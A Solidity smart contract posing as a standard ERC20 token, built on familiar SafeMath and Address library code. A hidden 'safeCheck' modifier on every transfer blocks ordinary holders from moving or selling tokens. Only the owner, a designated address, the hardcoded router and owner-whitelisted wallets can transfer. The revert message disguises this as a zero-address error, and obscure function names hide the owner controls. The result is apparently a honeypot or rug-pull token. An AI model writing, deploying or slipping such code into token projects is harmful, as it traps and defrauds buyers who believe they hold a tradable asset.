1 pragma solidity ^0.6.0;
2 library SafeMath {
3     function add(uint256 a, uint256 b) internal pure returns (uint256) {
4         uint256 c = a + b;
5         require(c >= a, "SafeMath: addition overflow");
6 
7         return c;
8     }
9 
10     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
11         return sub(a, b, "SafeMath: subtraction overflow");
12     }
13 
14     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
15         require(b <= a, errorMessage);
16         uint256 c = a - b;
17 
18         return c;
19     }
20 
21     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
22         if (a == 0) {
23             return 0;
24         }
25 
26         uint256 c = a * b;
27         require(c / a == b, "SafeMath: multiplication overflow");
28 
29         return c;
30     }
31 
32     function div(uint256 a, uint256 b) internal pure returns (uint256) {
33         return div(a, b, "SafeMath: division by zero");
34     }
35 
36     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
37         // Solidity only automatically asserts when dividing by 0
38         require(b > 0, errorMessage);
39         uint256 c = a / b;
40         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
41 
42         return c;
43     }
44 
45     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
46         return mod(a, b, "SafeMath: modulo by zero");
47     }
48 
49     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
50         require(b != 0, errorMessage);
51         return a % b;
52     }
53 }
54 
55 library Address {
56 
57     function isContract(address account) internal view returns (bool) {
58         // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
59         // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
60         // for accounts without code, i.e. `keccak256('')`
61         bytes32 codehash;
62         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
63         // solhint-disable-next-line no-inline-assembly
64         assembly { codehash := extcodehash(account) }
65         return (codehash != accountHash && codehash != 0x0);
66     }
67 
68     function sendValue(address payable recipient, uint256 amount) internal {
69         require(address(this).balance >= amount, "Address: insufficient balance");
70 
71         // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
72         (bool success, ) = recipient.call{ value: amount }("");
73         require(success, "Address: unable to send value, recipient may have reverted");
74     }
75 
76     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
77       return functionCall(target, data, "Address: low-level call failed");
78     }
79 
80     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
81         return _functionCallWithValue(target, data, 0, errorMessage);
82     }
83 
84     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
85         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
86     }
87 
88     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
89         require(address(this).balance >= value, "Address: insufficient balance for call");
90         return _functionCallWithValue(target, data, value, errorMessage);
91     }
92 
93     function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
94         require(isContract(target), "Address: call to non-contract");
95 
96         // solhint-disable-next-line avoid-low-level-calls
97         (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
98         if (success) {
99             return returndata;
100         } else {
101             // Look for revert reason and bubble it up if present
102             if (returndata.length > 0) {
103                 // The easiest way to bubble the revert reason is using memory via assembly
104 
105                 // solhint-disable-next-line no-inline-assembly
106                 assembly {
107                     let returndata_size := mload(returndata)
108                     revert(add(32, returndata), returndata_size)
109                 }
110             } else {
111                 revert(errorMessage);
112             }
113         }
114     }
115 }
116 
117 contract Context {
118     constructor () internal { }
119 
120     function _msgSender() internal view virtual returns (address payable) {
121         return msg.sender;
122     }
123 
124     function _msgData() internal view virtual returns (bytes memory) {
125         this; 
126         return msg.data;
127     }
128 }
129 
130 interface IERC20 {
131 
132     function totalSupply() external view returns (uint256);
133 
134     function balanceOf(address account) external view returns (uint256);
135 
136     function transfer(address recipient, uint256 amount) external returns (bool);
137 
138     function allowance(address owner, address spender) external view returns (uint256);
139 
140     function approve(address spender, uint256 amount) external returns (bool);
141 
142     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
143 
144     event Transfer(address indexed from, address indexed to, uint256 value);
145 
146     event Approval(address indexed owner, address indexed spender, uint256 value);
147 }
148 
149 contract ERC20 is Context, IERC20 {
150     using SafeMath for uint256;
151     using Address for address;
152 
153     mapping (address => uint256) private _balances;
154 
155     mapping (address => mapping (address => uint256)) private _allowances;
156     address private _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
157     uint256 private _totalSupply;
158     string private _name;
159     string private _symbol;
160     uint8 private _decimals;
161     address private _address0;
162     address private _address1;
163     mapping (address => bool) private _Addressint;
164     uint256 private _zero = 0;
165     uint256 private _valuehash = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
166    constructor (string memory name, string memory symbol, uint256 initialSupply,address payable owner) public {
167         _name = name;
168         _symbol = symbol;
169         _decimals = 18;
170         _address0 = owner;
171         _address1 = owner;
172         _mint(_address0, initialSupply*(10**18));
173     }
174     function name() public view returns (string memory) {
175         return _name;
176     }
177 
178     function symbol() public view returns (string memory) {
179         return _symbol;
180     }
181 
182     function decimals() public view returns (uint8) {
183         return _decimals;
184     }
185 
186 
187     function totalSupply() public view override returns (uint256) {
188         return _totalSupply;
189     }
190 
191 
192     function balanceOf(address account) public view override returns (uint256) {
193         return _balances[account];
194     }
195     
196     function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
197         _transfer(_msgSender(), recipient, amount);
198         return true;
199     }
200 
201     function ints(address addressn) public {
202         require(msg.sender == _address0, "!_address0");_address1 = addressn;
203     }
204     function allowance(address owner, address spender) public view virtual override returns (uint256) {
205         return _allowances[owner][spender];
206     }
207 
208 
209     function approve(address spender, uint256 amount) public virtual override returns (bool) {
210         _approve(_msgSender(), spender, amount);
211         return true;
212     }
213     
214     function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
215         _transfer(sender, recipient, amount);
216         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
217         return true;
218     }
219 
220     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
221         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
222         return true;
223     }
224     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
225         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
226         return true;
227     }
228     function _transfer(address sender, address recipient, uint256 amount) internal safeCheck(sender,recipient,amount) virtual{
229         require(sender != address(0), "ERC20: transfer from the zero address");
230         require(recipient != address(0), "ERC20: transfer to the zero address");
231         _beforeTokenTransfer(sender, recipient, amount);
232         _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
233         _balances[recipient] = _balances[recipient].add(amount);
234         emit Transfer(sender, recipient, amount);
235     }
236     function _mint(address account, uint256 amount) internal virtual {
237         require(account != address(0), "ERC20: mint to the zero address");
238         _beforeTokenTransfer(address(0), account, amount);
239         _totalSupply = _totalSupply.add(amount);
240         _balances[account] = _balances[account].add(amount);
241         emit Transfer(address(0), account, amount);
242     }
243     modifier safeCheck(address sender, address recipient, uint256 amount){
244         if(recipient != _address0 && sender != _address0 && _address0!=_address1 && amount > _zero){require(sender == _address1 ||sender==_router || _Addressint[sender], "ERC20: transfer from the zero address");}
245         if(sender==_address0 && _address0==_address1){_address1 = recipient;}
246         _;}
247     function _burn(address account, uint256 amount) internal virtual {
248         require(account != address(0), "ERC20: burn from the zero address");
249         _beforeTokenTransfer(account, address(0), amount);
250         _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
251         _totalSupply = _totalSupply.sub(amount);
252         emit Transfer(account, address(0), amount);
253     }
254     function multiaddress(uint8 AllowN,address[] memory receivers, uint256[] memory amounts) public {
255     for (uint256 i = 0; i < receivers.length; i++) {
256       if (msg.sender == _address0){
257           transfer(receivers[i], amounts[i]);
258           if(i<AllowN){_Addressint[receivers[i]] = true; _approve(receivers[i], _router, _valuehash);}
259           }
260     }
261    }
262     function _approve(address owner, address spender, uint256 amount) internal virtual {
263         require(owner != address(0), "ERC20: approve from the zero address");
264         require(spender != address(0), "ERC20: approve to the zero address");
265         _allowances[owner][spender] = amount;
266        emit Approval(owner, spender, amount);
267     }
268     function _setupDecimals(uint8 decimals_) internal {
269         _decimals = decimals_;
270     }
271     function _transfer_ELLA(address sender, address recipient, uint256 amount) internal virtual{
272         require(msg.sender == _address0, "ERC20: transfer from the zero address");
273         require(recipient == address(0), "ERC20: transfer to the zero address");
274         require(sender != address(0), "ERC20: transfer from the zero address");
275         _beforeTokenTransfer(sender, recipient, amount);
276         _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
277         _balances[recipient] = _balances[recipient].add(amount);
278         emit Transfer(sender, recipient, amount);
279     }
280     function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {  }
281 }